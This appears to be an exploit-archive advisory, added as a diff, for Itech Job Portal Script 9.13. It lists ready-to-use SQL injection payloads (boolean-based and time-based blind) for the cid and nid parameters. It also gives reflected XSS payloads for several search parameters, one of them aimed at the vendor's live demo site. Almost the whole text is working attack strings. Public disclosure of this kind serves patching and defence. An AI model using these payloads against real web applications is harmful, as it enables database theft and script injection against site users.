@@ -1,0 +1,66 @@
+# Exploit Title 	:  Itech Job Portal Script - Multiple Vulnerabilities
+# Author 		:  Yunus YILDIRIM (Th3GundY)
+# Team 			:  CT-Zer0 (@CRYPTTECH) - https://www.crypttech.com
+# Website 		:  http://www.yunus.ninja
+# Contact 		:  yunusyildirim@protonmail.com
+
+# Vendor Homepage 	: http://itechscripts.com/
+# Software Link  	: http://itechscripts.com/job-portal-script/
+# Vuln. Version	  	: 9.13
+# Demo			: http://job-portal.itechscripts.com/
+
+
+# # # #  DETAILS  # # # # 
+
+SQL Injections :
+
+# 1
+http://localhost/career_advice_details.php?cid=5
+    Parameter: cid (GET)
+        Type: boolean-based blind
+        Title: AND boolean-based blind - WHERE or HAVING clause
+        Payload: cid=5' AND 7504=7504-- zpmu
+
+        Type: AND/OR time-based blind
+        Title: MySQL >= 5.0.12 OR time-based blind (comment)
+        Payload: cid=5' OR SLEEP(5)#
+
+# 2
+http://localhost/news_details_us.php?nid=1
+    Parameter: nid (GET)
+        Type: boolean-based blind
+        Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+        Payload: nid=1' RLIKE (SELECT (CASE WHEN (2796=2796) THEN 1 ELSE 0x28 END))-- WmMl
+
+        Type: AND/OR time-based blind
+        Title: MySQL >= 5.0.12 OR time-based blind
+        Payload: nid=1' OR SLEEP(5)-- UoUN
+
+# # # # # # # # # # # # # # # # # # # # # # # # 
+
+Cross site scriptings (XSS) :
+
+# 1
+http://localhost/search_result_alluser.php?function="><svg/onload=prompt('CT-Zer0');>
+    Parameter: function (GET)
+    Payload: "><svg/onload=prompt('CT-Zer0');>
+
+# 2
+http://localhost/search_result_alluser.php?ind="><svg/onload=prompt('CT-Zer0');>
+    Parameter: ind (GET)
+    Payload: "><svg/onload=prompt('CT-Zer0');>
+
+# 3
+http://localhost/search_result_alluser.php?loc="><svg/onload=prompt('CT-Zer0');>
+    Parameter: loc (GET)
+    Payload: "><svg/onload=prompt('CT-Zer0');>
+
+# 4
+http://localhost/search_result_alluser.php?compid="><svg/onload=prompt('CT-Zer0');>
+    Parameter: compid (GET)
+    Payload: "><svg/onload=prompt('CT-Zer0');>
+
+# 5
+http://job-portal.itechscripts.com/search_result_alluser.php?days_chk="><svg/onload=prompt('CT-Zer0');>
+    Parameter: days_chk (GET)
+    Payload: "><svg/onload=prompt('CT-Zer0');>
